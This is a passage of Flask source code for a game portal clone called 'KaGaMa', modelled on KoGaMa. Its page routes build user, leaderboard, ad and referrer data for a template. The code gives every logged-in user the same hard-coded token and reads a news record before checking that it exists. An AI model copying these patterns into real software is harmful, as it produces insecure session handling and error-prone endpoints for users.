                "top_banner": {"num": "0", "id": "kogama_mobile_leaderboard_1", "ad_unit_code": "leaderboard", "sizes": "[728, 90]", "huge_sizes": "[[980, 90], [970, 90], [950, 90]]", "big_sizes": "[[980, 90], [970, 90], [950, 90]]", "mid_sizes": "[[728, 90],[468, 60]]", "small_sizes": "[[320, 50], [300, 50]]"},
                "skyscraper_left": {"num": "1", "id": "kogama-skyscraper-left", "sizes": "[160, 600]"},
                "skyscraper_right": {"num": "2", "id": "kogama-skyscraper-right", "sizes": "[160, 600]"},
                "bottom_banner": {"num": "4", "id": "kogama_mobile_leaderboard_2", "sizes": "[728, 90]"},
                "comment_ad": {"num": "5", "id": "kogama_rectangle", "sizes": "[300, 250]"},
                "wide_skyscraper": {"num": "3", "id": "kogama-wide-skyscraper", "sizes": "[300, 600]"},
                "game_list_banner": {"num": "6", "id": "kogama_mobile_game_list_banner", "sizes": "[728, 90]"}
            },
            "network_code": "46278883"
        }
    }

    # Current user (if logged in)
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }

    # Inject leaderboard data (full list)
    users = db.session.query(User).order_by(User._level.desc(), User.xp.desc()).all()
    leaderboard_data = []
    for idx, user in enumerate(users, start=1):
        avatar_images = user.AVATAR_IMAGES_MAP.get(user.avatar_id, {})
        leaderboard_data.append({
            'rank': idx,
            'id': user.id,
            'username': user.username,
            'level': user._level,
            'xp': user.xp,
            'gold': user.gold,
            'avatar_url': avatar_images.get('small', ''),
            'avatar_name': avatar_images.get('avatar_name', ''),
        })
    object_data['leaderboard'] = leaderboard_data
    object_data['leaderboard_total'] = len(users)
    object_data['leaderboard_names'] = {
        "X": [],
        "W": [],
        "M": [],
        "Y": [],
        "G": [],
    }

    return render_template('kagama.html', language=user_language, title=title,
                           error_data="null", breadcrumb_data="null",
                           submenu_data="null", object_data=object_data), 200

    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/news/')
def news_page():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/news/<int:news_id>/')
def news_feed_page(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    user = db.session.get(User, news_feed.profile_id)
    if not news_feed:
        abort(404)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "object":{
          "id":news_feed.id,
          "profile_id":news_feed.profile_id,
          "profile_username":news_feed.profile_username,
          "title":news_feed.title,
          "excerpt":news_feed.excerpt,
          "body_html":news_feed.body_html,
          "body":news_feed.body_html,
          "created":news_feed.created,
          "updated":news_feed.updated,
          "language":news_feed.language,
          "published":news_feed.published,
          "featured_image_id":0,
          "featured_images":json.loads(news_feed.featured_images),
          "avatar_id":user.avatar_id,
          "profile_images":user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "is_subscriber":0
       },
       "locale":"en_US",
       "referrers":[
          {
             "referrer_id":1,
             "name":"Kagama",
             "codename":"kogama",
             "urls":""
          },
          {
             "referrer_id":2,
             "name":"old_spilgames",
             "codename":"OldSpilGames",
             "urls":""
          },
          {
             "referrer_id":3,
             "name":"AdNPlay",
             "codename":"adnplay",
             "urls":""
          },
          {
             "referrer_id":4,
             "name":"GSM",
             "codename":"gsm",
             "urls":"games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id":5,
             "name":"Miniplay",
             "codename":"miniplay",
             "urls":"minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id":6,
             "name":"ORANGE",
             "codename":"orange",
             "urls":"kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id":7,
             "name":"CRAZYGAMES",
             "codename":"crazygames",
             "urls":"crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id":8,
             "name":"SpilGames",
             "codename":"spilgames",
             "urls":"cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "now":"2026-05-28T10:04:13.807173+00:00",
       "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":"true",
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/purchase/')
def redirect_from_purchase():
    return redirect(url_for('home'))

@app.route('/subscription/subscribe/')
def redirect_from_subscribe():
    return redirect(url_for('home'))

@app.route('/help/support/')
def help_for_support():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    main_admin = db.session.get(User, 1)
    second_admin = db.session.get(User, 2)
    third_admin = db.session.get(User, 4)
    fourth_admin = db.session.get(User, 7)
    object_data = {
        "object":[
        {
            "avatar_id":main_admin.avatar_id,
            "created":main_admin.created,
            "description":main_admin.description,
            "friends":main_admin.friends,
            "friends_limit":999,
            "gold":main_admin.gold,
            "id":main_admin.id,
            "images":main_admin.AVATAR_IMAGES_MAP.get(main_admin.avatar_id, {}),
            "is_active":True,
            "is_anonymous":False,
            "is_authenticated":False,
            "is_me":True if current_user.is_authenticated and current_user.id == main_admin.id else False,
            "is_subscriber":False,
            "last_ping":main_admin.last_ping,
            "leaderboard_rank":main_admin.rank,
            "level":main_admin._level,
            "level_images": get_level_images(main_admin._level),
            "level_progress":main_admin.level_progress,
            "next_level_xp":main_admin.next_level_xp,
            "notifications":0,
            "object_type_id":1,
            "previous_level_xp":main_admin.previous_level_xp,
            "published":0,
            "pulse_status":main_admin.pulse_status,
            "username":main_admin.username,
            "xp":main_admin.xp,
            "xp_to_next_level":main_admin.xp_to_next_level
        },
        {
            "avatar_id":second_admin.avatar_id,
            "created":second_admin.created,
            "description":second_admin.description,
            "friends":second_admin.friends,
            "friends_limit":999,
            "gold":second_admin.gold,
            "id":second_admin.id,
            "images":second_admin.AVATAR_IMAGES_MAP.get(second_admin.avatar_id, {}),
            "is_active":True,
            "is_anonymous":False,
            "is_authenticated":False,
            "is_me":True if current_user.is_authenticated and current_user.id == second_admin.id else False,
            "is_subscriber":False,
            "last_ping":second_admin.last_ping,
            "leaderboard_rank":second_admin.rank,
            "level":second_admin._level,
            "level_images": get_level_images(second_admin._level),
            "level_progress":second_admin.level_progress,
            "next_level_xp":second_admin.next_level_xp,
            "notifications":0,
            "object_type_id":1,
            "previous_level_xp":second_admin.previous_level_xp,
            "published":0,
            "pulse_status":second_admin.pulse_status,
            "username":second_admin.username,
            "xp":second_admin.xp,
            "xp_to_next_level":second_admin.xp_to_next_level
        },
        {
            "avatar_id":third_admin.avatar_id,
            "created":third_admin.created,
            "description":third_admin.description,
            "friends":third_admin.friends,
            "friends_limit":999,
            "gold":third_admin.gold,
            "id":third_admin.id,
            "images":third_admin.AVATAR_IMAGES_MAP.get(third_admin.avatar_id, {}),
            "is_active":True,
            "is_anonymous":False,
            "is_authenticated":False,
            "is_me":True if current_user.is_authenticated and current_user.id == third_admin.id else False,
            "is_subscriber":False,
            "last_ping":third_admin.last_ping,
            "leaderboard_rank":third_admin.rank,
            "level":third_admin._level,
            "level_images": get_level_images(third_admin._level),
            "level_progress":third_admin.level_progress,
            "next_level_xp":third_admin.next_level_xp,
            "notifications":0,
            "object_type_id":1,
            "previous_level_xp":third_admin.previous_level_xp,
            "published":0,
            "pulse_status":third_admin.pulse_status,
            "username":third_admin.username,
            "xp":third_admin.xp,
            "xp_to_next_level":third_admin.xp_to_next_level
        },
        {
            "avatar_id":fourth_admin.avatar_id,
            "created":fourth_admin.created,
            "description":fourth_admin.description,
            "friends":fourth_admin.friends,
            "friends_limit":999,
            "gold":fourth_admin.gold,
            "id":fourth_admin.id,
            "images":fourth_admin.AVATAR_IMAGES_MAP.get(fourth_admin.avatar_id, {}),
            "is_active":True,
            "is_anonymous":False,
            "is_authenticated":False,
            "is_me":True if current_user.is_authenticated and current_user.id == fourth_admin.id else False,
            "is_subscriber":False,
            "last_ping":fourth_admin.last_ping,
            "leaderboard_rank":fourth_admin.rank,
            "level":fourth_admin._level,
            "level_images": get_level_images(fourth_admin._level),
            "level_progress":fourth_admin.level_progress,
            "next_level_xp":fourth_admin.next_level_xp,
            "notifications":0,
            "object_type_id":1,
            "previous_level_xp":fourth_admin.previous_level_xp,
            "published":0,
            "pulse_status":fourth_admin.pulse_status,
            "username":fourth_admin.username,
            "xp":fourth_admin.xp,
            "xp_to_next_level":fourth_admin.xp_to_next_level
        }
        ],
        "locale":"en_US",
        "referrers":[
          {
             "referrer_id":1,
             "name":"Kagama",
             "codename":"kogama",
             "urls":""
          },
          {
             "referrer_id":2,
             "name":"old_spilgames",
             "codename":"OldSpilGames",
             "urls":""
          },
          {
             "referrer_id":3,
             "name":"AdNPlay",
             "codename":"adnplay",
             "urls":""
          },
          {
             "referrer_id":4,
             "name":"GSM",
             "codename":"gsm",
             "urls":"games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id":5,
             "name":"Miniplay",
             "codename":"miniplay",
             "urls":"minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id":6,
             "name":"ORANGE",
             "codename":"orange",
             "urls":"kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id":7,
             "name":"CRAZYGAMES",
             "codename":"crazygames",
             "urls":"crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id":8,
             "name":"SpilGames",
             "codename":"spilgames",
             "urls":"cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
        ],
        "now":"2026-05-28T01:23:38.859211+00:00",
        "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
